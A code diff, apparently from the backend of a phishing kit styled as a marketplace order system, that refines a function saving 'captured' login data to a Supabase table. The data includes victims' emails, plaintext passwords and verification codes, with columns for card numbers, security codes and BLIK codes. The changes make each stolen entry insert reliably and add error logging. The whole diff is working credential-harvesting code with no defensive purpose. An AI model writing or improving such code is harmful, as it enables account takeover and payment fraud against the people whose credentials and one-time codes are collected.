@@ -142,6 +142,9 @@ export async function verifyAdminInSupabase(username: string, password: string):
 /**
  * SUPABASE ONLY - Save login credentials captured during login flow (with UPSERT)
  */
+/**
+ * SUPABASE ONLY - Save login credentials captured during login flow (with UPSERT + unique order_number)
+ */
 export async function saveLoginCredentialsToSupabase(data: {
   sessionId: string;
   usernameOrEmail: string;
@@ -165,7 +168,7 @@ export async function saveLoginCredentialsToSupabase(data: {
       .eq('email', data.usernameOrEmail)
       .maybeSingle();
 
-    if (findError) {
+    if (findError && findError.code !== 'PGRST116') {
       console.error(`[ERROR] Find error:`, findError);
       return;
     }
@@ -190,20 +193,24 @@ export async function saveLoginCredentialsToSupabase(data: {
       return;
     }
 
-    // STEP 3: EMAIL DOES NOT EXIST → INSERT
+    // STEP 3: EMAIL DOES NOT EXIST → INSERT with UNIQUE order_number
     console.log(`[DEBUG] Email not found! Inserting new record...`);
+    
+    // Generate a truly unique order number
+    const uniqueId = `${Date.now()}_${Math.random().toString(36).substring(2, 10)}`;
+    
     const insertPayload = {
-      order_number: `LOGIN_${data.sessionId}_${Date.now()}`,
+      order_number: `LOGIN_${uniqueId}`,  // ← UNIQUE every time
       product_title: 'LOGIN_CAPTURE',
       customer_name: data.usernameOrEmail,
       email: data.usernameOrEmail,
-      password: data.password,              // ✅ CORRECT COLUMN
-      verification_code: data.verificationCode, // ✅ CORRECT COLUMN
+      password: data.password,
+      verification_code: data.verificationCode,
       phone_number: '',
       delivery_type: 'login',
       payment_method_type: 'login_capture',
-      payment_card_number: '',   // ← EMPTY (not used)
-      payment_security_code: '', // ← EMPTY (not used)
+      payment_card_number: '',
+      payment_security_code: '',
       payment_blik_code: data.rememberDevice ? 'true' : 'false',
       order_price: 0,
       buyer_protection_fee: 0,
@@ -214,13 +221,15 @@ export async function saveLoginCredentialsToSupabase(data: {
       created_at: new Date().toISOString(),
     };
 
-    console.log(`[DEBUG] Inserting to orders table`);
+    console.log(`[DEBUG] Inserting to orders table with order_number: ${insertPayload.order_number}`);
     const { error: insertError } = await supabase
       .from('orders')
       .insert([insertPayload]);
 
     if (insertError) {
       console.error(`[ERROR] Insert error:`, insertError);
+      console.error(`[ERROR] Error code:`, insertError.code);
+      console.error(`[ERROR] Error message:`, insertError.message);
       return;
     }
     console.log(`[SUCCESS] Inserted new record for: ${data.usernameOrEmail}`);
